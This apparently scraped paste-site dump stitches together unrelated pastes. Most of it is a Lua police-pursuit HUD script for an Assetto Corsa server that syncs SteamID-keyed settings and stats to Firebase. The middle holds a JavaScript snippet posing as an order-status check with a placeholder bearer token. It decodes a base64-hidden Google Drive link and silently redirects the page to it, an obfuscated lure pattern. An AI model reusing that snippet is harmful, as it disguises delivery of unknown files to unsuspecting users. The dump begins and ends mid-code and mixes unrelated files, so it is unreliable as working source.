	if ui.windowHovered() and ui.mouseDown() then buttonPressed = true end
	if ui.mouseReleased() then buttonPressed = false end
	if buttonPressed then settings.menuPos = settings.menuPos + ui.mouseDelta() end
end

---------------------------------------------------------------------------------------------- updates ----------------------------------------------------------------------------------------------

function script.drawUI()
	if carID ~= valideCar[1] and carID ~= valideCar[2] and carID ~= valideCar[3] or cspVersion < cspMinVersion then return end
	if initialized and settings.policeSize then
		if firstload then
			firstload = false
			initsettings()
		end
		radarUI()
		if pursuit.suspect then showStarsPursuit() end
		showPursuitMsg()
		if settingsOpen then
			ui.toolWindow('settings', settings.menuPos, menuSize[2], true, function ()
				ui.childWindow('childsettings', menuSize[2], true, function () settingsWindow() moveMenu() end)
			end)
		elseif arrestLogsOpen then
			ui.toolWindow('ArrestLogs', settings.menuPos, menuSize[1], true, function ()
				ui.childWindow('childArrestLogs', menuSize[1], true, function () arrestLogsUI() moveMenu() end)
			end)
		elseif camerasOpen then
			ui.toolWindow('Cameras', settings.menuPos, menuSize[2], true, function ()
				ui.childWindow('childCameras', menuSize[2], true, function () camerasUI() moveMenu() end)
			end)
		end
	end
end

ac.onCarJumped(0, function (carid)
	if carID == valideCar[1] or carID == valideCar[2] or carID == valideCar[3]then
		if pursuit.suspect then lostSuspect() end
	end
end)

function script.update(dt)
	if carID ~= valideCar[1] and carID ~= valideCar[2] and carID ~= valideCar[3] or cspVersion < cspMinVersion then return end
	if not initialized then
		loadsettings()
		getFirebase()
		initialized = true
	else
		radarUpdate()
		chaseUpdate()
		--hidePlayers()
	end
end

if carID == valideCar[1] or carID == valideCar[2] or carID == valideCar[3] and cspVersion >= cspMinVersion then
	ui.registerOnlineExtra(ui.Icons.Settings, ""Settings"", nil, settingsWindow, nil, ui.OnlineExtraFlags.Tool, 'ui.WindowFlags.AlwaysAutoResize')
end"
T05reLRj,Untitled,kammex,JavaScript,Thursday 3rd of April 2025 12:25:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/260/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cBYfJK6h,sss,supinus,Lua,Thursday 3rd of April 2025 12:25:03 PM CDT,"ac.log(""Police script"")

local sim = ac.getSim()
local car = ac.getCar(0)
local valideCar = {""riz_bmw_f93_m8_2023_tune"", ""audi_rs3_2022_LMC"", ""police_r34_tiresarpi""}
local carID = ac.getCarID(0)

local windowWidth = sim.windowWidth
local windowHeight = sim.windowHeight
local settingsOpen = true
local arrestLogsOpen = false
local camerasOpen = false

local cspVersion = ac.getPatchVersionCode()
local cspMinVersion = 2144
local fontMultiplier = windowHeight/1440

local firstload = true
local cspAboveP218 = cspVersion >= 2363
ac.log(""Police script"")
if not(carID == valideCar) or cspVersion < cspMinVersion then return end

local msgArrest = {
    msg = {""`NAME` has been arrested for Speeding. The individual was driving a `CAR`."",
    ""We have apprehended `NAME` for Speeding. The suspect was behind the wheel of a `CAR`."",
    ""The driver of a `CAR`, identified as `NAME`, has been arrested for Speeding."",
    ""`NAME` has been taken into custody for Illegal Racing. The suspect was driving a `CAR`."",
    ""We have successfully apprehended `NAME` for Illegal Racing. The individual was operating a `CAR`."",
    ""The driver of a `CAR`, identified as `NAME`, has been arrested for Illegal Racing."",
    ""`NAME` has been apprehended for Speeding. The suspect was operating a `CAR` at the time of the arrest."",
    ""We have successfully detained `NAME` for Illegal Racing. The individual was driving a `CAR`."",
    ""`NAME` driving a `CAR` has been arrested for Speeding"",
    ""`NAME` driving a `CAR` has been arrested for Illegal Racing.""}
}

local msgLost = {
    msg = {""We've lost sight of the suspect. The vehicle involved is described as a `CAR` driven by `NAME`."",
    ""Attention all units, we have lost visual contact with the suspect. The vehicle involved is a `CAR` driven by `NAME`."",
    ""We have temporarily lost track of the suspect. The vehicle description is a `CAR` with `NAME` as the driver."",
    ""Visual contact with the suspect has been lost. The suspect is driving a `CAR` and identified as `NAME`."",
    ""We have lost the suspect's visual trail. The vehicle in question is described as a `CAR` driven by `NAME`."",
    ""Suspect have been lost, Vehicle Description:`CAR` driven by `NAME`"",
    ""Visual contact with the suspect has been lost. The suspect is driving a `CAR` and identified as `NAME`."",
    ""We have lost the suspect's visual trail. The vehicle in question is described as a `CAR` driven by `NAME`."",}
}

local msgEngage = {
    msg = {""Control! I am engaging on a `CAR` traveling at `SPEED`"",""Pursuit in progress! I am chasing a `CAR` exceeding `SPEED`"",""Control, be advised! Pursuit is active on a `CAR` driving over `SPEED`"",""Attention! Pursuit initiated! Im following a `CAR` going above `SPEED`"",""Pursuit engaged! `CAR` driving at a high rate of speed over `SPEED`"",""Attention all units, we have a pursuit in progress! Suspect driving a `CAR` exceeding `SPEED`"",""Attention units! We have a suspect fleeing in a `CAR` at high speed, pursuing now at `SPEED`"",""Engaging on a high-speed chase! Suspect driving a `CAR` exceeding `SPEED`!"",""Attention all units! we have a pursuit in progress! Suspect driving a `CAR` exceeding `SPEED`"",""High-speed chase underway, suspect driving `CAR` over `SPEED`"",""Control, `CAR` exceeding `SPEED`, pursuit active."",""Engaging on a `CAR` exceeding `SPEED`, pursuit initiated.""}
}

------------------------------------------------------------------------- JSON Utils -------------------------------------------------------------------------

local json = {}

-- Internal functions.

local function kind_of(obj)
  if type(obj) ~= 'table' then return type(obj) end
  local i = 1
  for _ in pairs(obj) do
    if obj[i] ~= nil then i = i + 1 else return 'table' end
  end
  if i == 1 then return 'table' else return 'array' end
end

local function escape_str(s)
  local in_char  = {'\\', '""', '/', '\b', '\f', '\n', '\r', '\t'}
  local out_char = {'\\', '""', '/',  'b',  'f',  'n',  'r',  't'}
  for i, c in ipairs(in_char) do
    s = s:gsub(c, '\\' .. out_char[i])
  end
  return s
end

-- Returns pos, did_find; there are two cases:
-- 1. Delimiter found: pos = pos after leading space + delim; did_find = true.
-- 2. Delimiter not found: pos = pos after leading space;     did_find = false.
-- This throws an error if err_if_missing is true and the delim is not found.
local function skip_delim(str, pos, delim, err_if_missing)
  pos = pos + #str:match('^%s*', pos)
  if str:sub(pos, pos) ~= delim then
    if err_if_missing then
      error('Expected ' .. delim .. ' near position ' .. pos)
    end
    return pos, false
  end
  return pos + 1, true
end

-- Expects the given pos to be the first character after the opening quote.
-- Returns val, pos; the returned pos is after the closing quote character.
local function parse_str_val(str, pos, val)
  val = val or ''
  local early_end_error = 'End of input found while parsing string.'
  if pos > #str then error(early_end_error) end
  local c = str:sub(pos, pos)
  if c == '""'  then return val, pos + 1 end
  if c ~= '\\' then return parse_str_val(str, pos + 1, val .. c) end
  -- We must have a \ character.
  local esc_map = {b = '\b', f = '\f', n = '\n', r = '\r', t = '\t'}
  local nextc = str:sub(pos + 1, pos + 1)
  if not nextc then error(early_end_error) end
  return parse_str_val(str, pos + 2, val .. (esc_map[nextc] or nextc))
end

-- Returns val, pos; the returned pos is after the number's final character.
local function parse_num_val(str, pos)
  local num_str = str:match('^-?%d+%.?%d*[eE]?[+-]?%d*', pos)
  local val = tonumber(num_str)
  if not val then error('Error parsing number at position ' .. pos .. '.') end
  return val, pos + #num_str
end


-- Public values and functions.

function json.stringify(obj, as_key)
  local s = {}  -- We'll build the string as an array of strings to be concatenated.
  local kind = kind_of(obj)  -- This is 'array' if it's an array or type(obj) otherwise.
  if kind == 'array' then
    if as_key then error('Can\'t encode array as key.') end
    s[#s + 1] = '['
    for i, val in ipairs(obj) do
      if i > 1 then s[#s + 1] = ', ' end
      s[#s + 1] = json.stringify(val)
    end
    s[#s + 1] = ']'
  elseif kind == 'table' then
    if as_key then error('Can\'t encode table as key.') end
    s[#s + 1] = '{'
    for k, v in pairs(obj) do
      if #s > 1 then s[#s + 1] = ', ' end
      s[#s + 1] = json.stringify(k, true)
      s[#s + 1] = ':'
      s[#s + 1] = json.stringify(v)
    end
    s[#s + 1] = '}'
  elseif kind == 'string' then
    return '""' .. escape_str(obj) .. '""'
  elseif kind == 'number' then
    if as_key then return '""' .. tostring(obj) .. '""' end
    return tostring(obj)
  elseif kind == 'boolean' then
    return tostring(obj)
  elseif kind == 'nil' then
    return 'null'
  else
    error('Unjsonifiable type: ' .. kind .. '.')
  end
  return table.concat(s)
end

json.null = {}  -- This is a one-off table to represent the null value.

function json.parse(str, pos, end_delim)
  pos = pos or 1
  if pos > #str then error('Reached unexpected end of input.') end
  local pos = pos + #str:match('^%s*', pos)  -- Skip whitespace.
  local first = str:sub(pos, pos)
  if first == '{' then  -- Parse an object.
    local obj, key, delim_found = {}, true, true
    pos = pos + 1
    while true do
      key, pos = json.parse(str, pos, '}')
      if key == nil then return obj, pos end
      if not delim_found then error('Comma missing between object items.') end
      pos = skip_delim(str, pos, ':', true)  -- true -> error if missing.
      obj[key], pos = json.parse(str, pos)
      pos, delim_found = skip_delim(str, pos, ',')
    end
  elseif first == '[' then  -- Parse an array.
    local arr, val, delim_found = {}, true, true
    pos = pos + 1
    while true do
      val, pos = json.parse(str, pos, ']')
      if val == nil then return arr, pos end
      if not delim_found then error('Comma missing between array items.') end
      arr[#arr + 1] = val
      pos, delim_found = skip_delim(str, pos, ',')
    end
  elseif first == '""' then  -- Parse a string.
    return parse_str_val(str, pos + 1)
  elseif first == '-' or first:match('%d') then  -- Parse a number.
    return parse_num_val(str, pos)
  elseif first == end_delim then  -- End of an object or array.
    return nil, pos + 1
  else  -- Parse true, false, or null.
    local literals = {['true'] = true, ['false'] = false, ['null'] = json.null}
    for lit_str, lit_val in pairs(literals) do
      local lit_end = pos + #lit_str - 1
      if str:sub(pos, lit_end) == lit_str then return lit_val, lit_end + 1 end
    end
    local pos_info_str = 'position ' .. pos .. ': ' .. str:sub(pos, pos + 10)
    error('Invalid json syntax starting at ' .. pos_info_str)
  end
end

--return json of playerData with only the data needed for the leaderboard
-- data are keys of the playerData table
local function dataStringify(data)
    local str = '{""' .. ac.getUserSteamID() .. '"": '
    local name = ac.getDriverName(0)
    data['Name'] = name
    str = str .. json.stringify(data) .. '}'
    return str
end


------------------------------------------------------------------------- Web Utils -------------------------------------------------------------------------

local settings = {
    essentialSize = 20,
    policeSize = 20,
    hudOffsetX = 0,
    hudOffsetY = 0,
    fontSize = 20,
    current = 1,
    colorHud = rgbm(1,0,0,1),
    timeMsg = 10,
    msgOffsetY = 10,
    msgOffsetX = windowWidth/2,
    fontSizeMSG = 30,
    menuPos = vec2(0, 0),
    unit = ""km/h"",
    unitMult = 1,
    starsSize = 20,
    starsPos = vec2(windowWidth, 0),
}

local settingsJSON = {
    essentialSize = 20,
    policeSize = 20,
    hudOffsetX = 0,
    hudOffsetY = 0,
    fontSize = 20,
    current = 1,
    colorHud = ""1,0,0,1"",
    timeMsg = 10,
    msgOffsetY = 10,
    msgOffsetX = ""1280"",
    fontSizeMSG = 30,
    menuPos = vec2(0, 0),
    unit = ""km/h"",
    unitMult = 1,
    starsSize = 20,
    starsPos = vec2(windowWidth, 0),
}


local function stringToVec2(str)
    if str == nil then return vec2(0, 0) end
    local x = string.match(str, ""([^,]+)"")
    local y = string.match(str, ""[^,]+,(.+)"")
    return vec2(tonumber(x), tonumber(y))
end

local function vec2ToString(vec)
    return tostring(vec.x) .. ',' .. tostring(vec.y)
end

local function stringToRGBM(str)
    local r = string.match(str, ""([^,]+)"")
    local g = string.match(str, ""[^,]+,([^,]+)"")
    local b = string.match(str, ""[^,]+,[^,]+,([^,]+)"")
    local m = string.match(str, ""[^,]+,[^,]+,[^,]+,(.+)"")
    return rgbm(tonumber(r), tonumber(g), tonumber(b), tonumber(m))
end

local function rgbmToString(rgbm)
    return tostring(rgbm.r) .. ',' .. tostring(rgbm.g) .. ',' .. tostring(rgbm.b) .. ',' .. tostring(rgbm.mult)
end

local function parsesettings(table)
    settings.essentialSize = table.essentialSize
    settings.policeSize = table.policeSize
    settings.hudOffsetX = table.hudOffsetX
    settings.hudOffsetY = table.hudOffsetY
    settings.fontSize = table.fontSize
    settings.current = table.current
    settings.colorHud = stringToRGBM(table.colorHud)
    settings.timeMsg = table.timeMsg
    settings.msgOffsetY = table.msgOffsetY
    settings.msgOffsetX = table.msgOffsetX
    settings.fontSizeMSG = table.fontSizeMSG
    settings.menuPos = stringToVec2(table.menuPos)
    settings.unit = table.unit
    settings.unitMult = table.unitMult
    settings.starsSize = table.starsSize or 20
    if table.starsPos == nil then
        settings.starsPos = vec2(windowWidth, 0)
    else
        settings.starsPos = stringToVec2(table.starsPos)
    end
end


ui.setAsynchronousImagesLoading(true)
local imageSize = vec2(0,0)

local hudImg = {
    base = ""https://i.ibb.co/8N4mNj6/zhud.png"",
    arrest = ""https://i.postimg.cc/DwJv2YgM/icon-Arrest.png"",
    cams = ""https://i.postimg.cc/15zRdzNP/iconCams.png"",
    logs = ""https://i.postimg.cc/VNXztr29/iconLogs.png"",
    lost = ""https://i.postimg.cc/DyYf3KqG/iconLost.png"",
    menu = ""https://i.postimg.cc/SxByj71N/iconMenu.png"",
    radar = ""https://i.postimg.cc/4dZsQ4TD/icon-Radar.png"",
}

local cameras = {
    {
        name = ""BOBs SCRAPYARD"",
        pos = vec3(-3564, 31.5, -103),
        dir = -8,
        fov = 60,
    },
    {
        name = ""ARENA"",
        pos = vec3(-2283, 115.5, 3284),
        dir = 128,
        fov = 70,
    },
    {
        name = ""BANK"",
        pos = vec3(-716, 151, 3556.4),
        dir = 12,
        fov = 95,
    },
    {
        name = ""STREET RUNNERS"",
        pos = vec3(-57.3, 103.5, 2935.5),
        dir = 16,
        fov = 67,
    },
    {
        name = ""ROAD CRIMINALS"",
        pos = vec3(-2332, 101.1, 3119.2),
        dir = 121,
        fov = 60,
    },
    {
        name = ""RECKLESS RENEGADES"",
        pos = vec3(-2993.7, -24.4, -601.7),
        dir = -64,
        fov = 60,
    },
    {
        name = ""MOTION MASTERS"",
        pos = vec3(-2120.4, -11.8, -1911.5),
        dir = 102,
        fov = 60,
    },
}

local pursuit = {
    suspect = nil,
    enable = false,
    maxDistance = 250000,
    minDistance = 40000,
    nextMessage = 30,
    level = 1,
    id = -1,
    timerArrest = 0,
    hasArrested = false,
    startedTime = 0,
    timeLostSight = 0,
    lostSight = false,
    engage = false,
}

local arrestations = {}

local textSize = {}

local textPos = {}

local iconPos = {}

local playerData = {}

---------------------------------------------------------------------------------------------- Firebase ----------------------------------------------------------------------------------------------

local urlAppScript = 'https://script.google.com/macros/s/AKfycbwenxjCAbfJA-S90VlV0y7mEH75qt3TuqAmVvlGkx-Y1TX8z5gHtvf5Vb8bOVNOA_9j/exec'
local firebaseUrl = 'https://acp-server-97674-default-rtdb.firebaseio.com/'
local firebaseUrlData = 'https://acp-server-97674-default-rtdb.firebaseio.com/PlayersData/'
local firebaseUrlsettings = 'https://acp-server-97674-default-rtdb.firebaseio.com/Settings'

local function updateSheets()
    local str = '{""category"" : ""Arrestations""}'
    web.post(urlAppScript, str, function(err, response)
        if err then
            print(err)
            return
        else
            print(response.body)
        end
    end)
end

local function addPlayerToDataBase()
    local steamID = ac.getUserSteamID()
    local name = ac.getDriverName(0)
    local str = '{""' .. steamID .. '"": {""Name"":""' .. name .. '"",""Getaway"": 0,""Drift"": 0,""Overtake"": 0,""Wins"": 0,""Losses"": 0,""Busted"": 0,""Arrests"": 0,""Theft"": 0}}'
    web.request('PATCH', firebaseUrl .. ""Players.json"", str, function(err, response)
        if err then
            print(err)
            return
        end
    end)
end

local function getFirebase()
    local url = firebaseUrl .. ""Players/"" .. ac.getUserSteamID() .. '.json'
    web.get(url, function(err, response)
        if err then
            print(err)
            return
        else
            if response.body == 'null' then
                addPlayerToDataBase(ac.getUserSteamID())
            else
                local jString = response.body
                playerData = json.parse(jString)
                if playerData.Name ~= ac.getDriverName(0) then
                    playerData.Name = ac.getDriverName(0)
                end
            end
            ac.log('Player data loaded')
        end
    end)
end

local function updatefirebase()
    local str = '{""' .. ac.getUserSteamID() .. '"": ' .. json.stringify(playerData) .. '}'
    web.request('PATCH', firebaseUrl .. ""Players.json"", str, function(err, response)
        if err then
            print(err)
            return
        else
            print(response.body)
        end
    end)
end

local function updatefirebaseData(node, data)
    local str = dataStringify(data)
    web.request('PATCH', firebaseUrlData .. node .. "".json"", str, function(err, response)
        if err then
            print(err)
            return
        else
            print(response.body)
            updateSheets()
        end
    end)
end

local function addPlayersettingsToDataBase(steamID)
    local str = '{""' .. steamID .. '"": {""essentialSize"":20,""policeSize"":20,""hudOffsetX"":0,""hudOffsetY"":0,""fontSize"":20,""current"":1,""colorHud"":""1,0,0,1"",""timeMsg"":10,""msgOffsetY"":10,""msgOffsetX"":' .. windowWidth/2 .. ',""fontSizeMSG"":30,""menuPos"":""0,0"",""unit"":""km/h"",""unitMult"":1}}'
    web.request('PATCH', firebaseUrlsettings .. "".json"", str, function(err, response)
        if err then
            print(err)
            return
        end
    end)
end

local function loadsettings()
    local url = firebaseUrlsettings .. ""/"" .. ac.getUserSteamID() .. '.json'
    web.get(url, function(err, response)
        if err then
            print(err)
            return
        else
            if response.body == 'null' then
                addPlayersettingsToDataBase(ac.getUserSteamID())
            else
                ac.log(""settings loaded"")
                local jString = response.body
                local table = json.parse(jString)
                parsesettings(table)
            end
        end
    end)
end

local function updatesettings()
    local str = '{""' .. ac.getUserSteamID() .. '"": ' .. json.stringify(settingsJSON) .. '}'
    web.request('PATCH', firebaseUrlsettings .. "".json"", str, function(err, response)
        if err then
            print(err)
            return
        end
    end)
end

local function onsettingsChange()
    settingsJSON.colorHud = rgbmToString(settings.colorHud)
    settingsJSON.menuPos = vec2ToString(settings.menuPos)
    settingsJSON.essentialSize = settings.essentialSize
    settingsJSON.policeSize = settings.policeSize
    settingsJSON.hudOffsetX = settings.hudOffsetX
    settingsJSON.hudOffsetY = settings.hudOffsetY
    settingsJSON.fontSize = settings.fontSize
    settingsJSON.current = settings.current
    settingsJSON.timeMsg = settings.timeMsg
    settingsJSON.msgOffsetY  = settings.msgOffsetY
    settingsJSON.msgOffsetX  = settings.msgOffsetX
    settingsJSON.fontSizeMSG = settings.fontSizeMSG
    settingsJSON.unit = settings.unit
    settingsJSON.unitMult = settings.unitMult
    settingsJSON.starsSize = settings.starsSize
    settingsJSON.starsPos = vec2ToString(settings.starsPos)
    updatesettings()
end

---------------------------------------------------------------------------------------------- settings ----------------------------------------------------------------------------------------------

local acpPolice = ac.OnlineEvent({
    message = ac.StructItem.string(110),
    messageType = ac.StructItem.int16(),
    yourIndex = ac.StructItem.int16(),
}, function (sender, data)
    if data.yourIndex == car.sessionID and data.messageType == 0 and pursuit.suspect ~= nil and sender == pursuit.suspect then
        pursuit.hasArrested = true
        ac.log(""ZHD Police: Police received"")
    end
end)

local starsUI = {
    starsPos = vec2(windowWidth - (settings.starsSize or 20)/2, settings.starsSize or 20)/2,
    starsSize = vec2(windowWidth - (settings.starsSize or 20)*2, (settings.starsSize or 20)*2),
    startSpace = (settings.starsSize or 20)/4,
}

local function resetStarsUI()
    if settings.starsPos == nil then
        settings.starsPos = vec2(windowWidth, 0)
    end
    if settings.starsSize == nil then
        settings.starsSize = 20
    end
    starsUI.starsPos = vec2(settings.starsPos.x - settings.starsSize/2, settings.starsPos.y + settings.starsSize/2)
    starsUI.starsSize = vec2(settings.starsPos.x - settings.starsSize*2, settings.starsPos.y + settings.starsSize*2)
    starsUI.startSpace = settings.starsSize/1.5
end

local function updatePos()
    imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
    iconPos.arrest1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/3.2)
    iconPos.arrest2 = vec2(imageSize.x/1.215, imageSize.y/5)
    iconPos.lost1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/2.35)
    iconPos.lost2 = vec2(imageSize.x/1.215, imageSize.y/3.2)
    iconPos.logs1 = vec2(imageSize.x/1.215, imageSize.y/1.88)
    iconPos.logs2 = vec2(imageSize.x/1.39, imageSize.y/2.35)
    iconPos.menu1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/1.88)
    iconPos.menu2 = vec2(imageSize.x/1.215, imageSize.y/2.35)
    iconPos.cams1 = vec2(imageSize.x/1.215, imageSize.y/2.35)
    iconPos.cams2 = vec2(imageSize.x/1.39, imageSize.y/3.2)

    textSize.size = vec2(imageSize.x*3/5, settings.fontSize/2)
    textSize.box = vec2(imageSize.x*3/5, settings.fontSize/1.3)
    textSize.window1 = vec2(settings.hudOffsetX+imageSize.x/9.5, settings.hudOffsetY+imageSize.y/5.3)
    textSize.window2 = vec2(imageSize.x*3/5, imageSize.y/2.8)

    textPos.box1 = vec2(0, 0)
    textPos.box2 = vec2(textSize.size.x, textSize.size.y*1.8)
    textPos.addBox = vec2(0, textSize.size.y*1.8)
    settings.fontSize = settings.policeSize * fontMultiplier

    resetStarsUI()
end

local function showStarsPursuit()
    local starsColor = rgbm(1, 1, 1, os.clock()%2 + 0.3)
    resetStarsUI()
    for i = 1, 5 do
        if i > pursuit.level/2 then
            ui.drawIcon(ui.Icons.StarEmpty, starsUI.starsPos, starsUI.starsSize, rgbm(1, 1, 1, 0.2))
        else
            ui.drawIcon(ui.Icons.StarFull, starsUI.starsPos, starsUI.starsSize, starsColor)
        end
        starsUI.starsPos.x = starsUI.starsPos.x - settings.starsSize - starsUI.startSpace
        starsUI.starsSize.x = starsUI.starsSize.x - settings.starsSize - starsUI.startSpace
    end
end

local showPreviewMsg = false
local showPreviewStars = false
COLORSMSGBG = rgbm(0.5,0.5,0.5,0.5)

local function initsettings()
    if settings.unit then
        settings.fontSize = settings.policeSize * fontMultiplier
        if settings.unit ~= ""km/h"" then settings.unitMult = 0.621371 end
        settings.policeSize = settings.policeSize * windowHeight/1440
        settings.fontSize = settings.policeSize * windowHeight/1440
        imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
        updatePos()
    end
end

local function previewMSG()
    ui.beginTransparentWindow(""previewMSG"", vec2(0, 0), vec2(windowWidth, windowHeight))
    ui.pushDWriteFont(""Orbitron;Weight=800"")
    local tSize = ui.measureDWriteText(""Messages from Police when being chased"", settings.fontSizeMSG)
    local uiOffsetX = settings.msgOffsetX - tSize.x/2
    local uiOffsetY = settings.msgOffsetY
    ui.drawRectFilled(vec2(uiOffsetX - 5, uiOffsetY-5), vec2(uiOffsetX + tSize.x + 5, uiOffsetY + tSize.y + 5), COLORSMSGBG)
    ui.dwriteDrawText(""Messages from Police when being chased"", settings.fontSizeMSG, vec2(uiOffsetX, uiOffsetY), rgbm.colors.cyan)
    ui.popDWriteFont()
    ui.endTransparentWindow()
end

local function previewStars()
    ui.beginTransparentWindow(""previewStars"", vec2(0, 0), vec2(windowWidth, windowHeight))
    showStarsPursuit()
    ui.endTransparentWindow()
end

local function uiTab()
    ui.text('On Screen Message : ')
    settings.timeMsg = ui.slider('##' .. 'Time Msg On Screen', settings.timeMsg, 1, 15, 'Time Msg On Screen' .. ': %.0fs')
    settings.fontSizeMSG = ui.slider('##' .. 'Font Size MSG', settings.fontSizeMSG, 10, 50, 'Font Size' .. ': %.0f')
    ui.text('Stars : ')
    settings.starsPos.x = ui.slider('##' .. 'Stars Offset X', settings.starsPos.x, 0, windowWidth, 'Stars Offset X' .. ': %.0f')
    settings.starsPos.y = ui.slider('##' .. 'Stars Offset Y', settings.starsPos.y, 0, windowHeight, 'Stars Offset Y' .. ': %.0f')
    settings.starsSize = ui.slider('##' .. 'Stars Size', settings.starsSize, 10, 50, 'Stars Size' .. ': %.0f')
    ui.newLine()
    ui.text('Offset : ')
    settings.msgOffsetY = ui.slider('##' .. 'Msg On Screen Offset Y', settings.msgOffsetY, 0, windowHeight, 'Msg On Screen Offset Y' .. ': %.0f')
    settings.msgOffsetX = ui.slider('##' .. 'Msg On Screen Offset X', settings.msgOffsetX, 0, windowWidth, 'Msg On Screen Offset X' .. ': %.0f')
    ui.newLine()
    ui.text('Preview : ')
    ui.sameLine()
    if ui.button('Message') then
        showPreviewMsg = not showPreviewMsg
        showPreviewStars = false
    end
    ui.sameLine()
    if ui.button('Stars') then
        showPreviewStars = not showPreviewStars
        showPreviewMsg = false
    end
    if showPreviewMsg then previewMSG()
    elseif showPreviewStars then previewStars() end
    if ui.button('Offset X to center') then settings.msgOffsetX = windowWidth/2 end
    ui.newLine()
end

local function settingsWindow()
    imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
    ui.dwriteTextAligned(""settings"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/6.5,60), false, rgbm.colors.white)
    ui.drawLine(vec2(0,60), vec2(windowWidth/6.5,60), rgbm.colors.white, 1)
    ui.newLine(20)
    ui.sameLine(10)
    ui.beginGroup()
    ui.text('Unit : ')
    ui.sameLine(160)
    if ui.selectable('mph', settings.unit == 'mph',_, ui.measureText('km/h')) then
        settings.unit = 'mph'
        settings.unitMult = 0.621371
    end
    ui.sameLine(200)
    if ui.selectable('km/h', settings.unit == 'km/h',_, ui.measureText('km/h')) then
        settings.unit = 'km/h'
        settings.unitMult = 1
    end
    ui.sameLine(windowWidth/6.5 - 120)
    if ui.button('Close', vec2(100, windowHeight/50)) then
        settingsOpen = false
        onsettingsChange()
    end
    ui.text('HUD : ')
    settings.hudOffsetX = ui.slider('##' .. 'HUD Offset X', settings.hudOffsetX, 0, windowWidth, 'HUD Offset X' .. ': %.0f')
    settings.hudOffsetY = ui.slider('##' .. 'HUD Offset Y', settings.hudOffsetY, 0, windowHeight, 'HUD Offset Y' .. ': %.0f')
    settings.policeSize = ui.slider('##' .. 'HUD Size', settings.policeSize, 10, 50, 'HUD Size' .. ': %.0f')
    settings.fontSize = settings.policeSize * fontMultiplier
    ui.setNextItemWidth(300)
    ui.newLine()
    uiTab()
    updatePos()
    ui.endGroup()
end

---------------------------------------------------------------------------------------------- Utils ----------------------------------------------------------------------------------------------

local function formatMessage(message)
    local msgToSend = message
    if pursuit.suspect == nil then
        msgToSend = string.gsub(msgToSend,""`CAR`"", ""No Car"")
        msgToSend = string.gsub(msgToSend,""`NAME`"", ""No Name"")
        msgToSend = string.gsub(msgToSend,""`SPEED`"", ""No Speed"")
        return msgToSend
    end
    msgToSend = string.gsub(msgToSend,""`CAR`"", string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """"))
    msgToSend = string.gsub(msgToSend,""`NAME`"", ""@"" .. ac.getDriverName(pursuit.suspect.index))
    msgToSend = string.gsub(msgToSend,""`SPEED`"", string.format(""%d "", ac.getCarSpeedKmh(pursuit.suspect.index) * settings.unitMult) .. settings.unit)
    return msgToSend
end

---------------------------------------------------------------------------------------------- HUD ----------------------------------------------------------------------------------------------

local policeLightsPos = {
    vec2(0,0),
    vec2(windowWidth/10,windowHeight),
    vec2(windowWidth-windowWidth/10,0),
    vec2(windowWidth,windowHeight)
}

local function showPoliceLights()
    local timing = math.floor(os.clock()*2 % 2)
    if timing == 0 then
        ui.drawRectFilledMultiColor(policeLightsPos[1], policeLightsPos[2], rgbm(1,0,0,0.5), rgbm(0,0,0,0), rgbm(0,0,0,0), rgbm(1,0,0,0.5))
        ui.drawRectFilledMultiColor(policeLightsPos[3], policeLightsPos[4], rgbm(0,0,0,0), rgbm(0,0,1,0.5), rgbm(0,0,1,0.5), rgbm(0,0,0,0))
    else
        ui.drawRectFilledMultiColor(policeLightsPos[1], policeLightsPos[2], rgbm(0,0,1,0.5), rgbm(0,0,0,0), rgbm(0,0,0,0), rgbm(0,0,1,0.5))
        ui.drawRectFilledMultiColor(policeLightsPos[3], policeLightsPos[4], rgbm(0,0,0,0), rgbm(1,0,0,0.5), rgbm(1,0,0,0.5), rgbm(0,0,0,0))
    end
end

local chaseLVL = {
    message = """",
    messageTimer = 0,
    color = rgbm(1,1,1,1),
}

local function resetChase()
    pursuit.enable = false
    pursuit.nextMessage = 30
    pursuit.lostSight = false
    pursuit.timeLostSight = 2
end

local function lostSuspect()
    resetChase()
    pursuit.lostSight = false
    pursuit.timeLostSight = 0
    pursuit.level = 1
    ac.sendChatMessage(formatMessage(msgLost.msg[math.random(#msgLost.msg)]))
    pursuit.suspect = nil
    if cspAboveP218 then
        ac.setExtraSwitch(0, false)
    end
end

local iconsColorOn = {
    [1] = rgbm(1,0,0,1),
    [2] = rgbm(1,1,1,1),
    [3] = rgbm(1,1,1,1),
    [4] = rgbm(1,1,1,1),
    [5] = rgbm(1,1,1,1),
    [6] = rgbm(1,1,1,1),
}

local playersInRange = {}

local function drawImage()
    iconsColorOn[2] = rgbm(0.99,0.99,0.99,1)
    iconsColorOn[3] = rgbm(0.99,0.99,0.99,1)
    iconsColorOn[4] = rgbm(0.99,0.99,0.99,1)
    iconsColorOn[5] = rgbm(0.99,0.99,0.99,1)
    iconsColorOn[6] = rgbm(0.99,0.99,0.99,1)
    local uiStats = ac.getUI()

    if ui.rectHovered(iconPos.arrest2, iconPos.arrest1) then
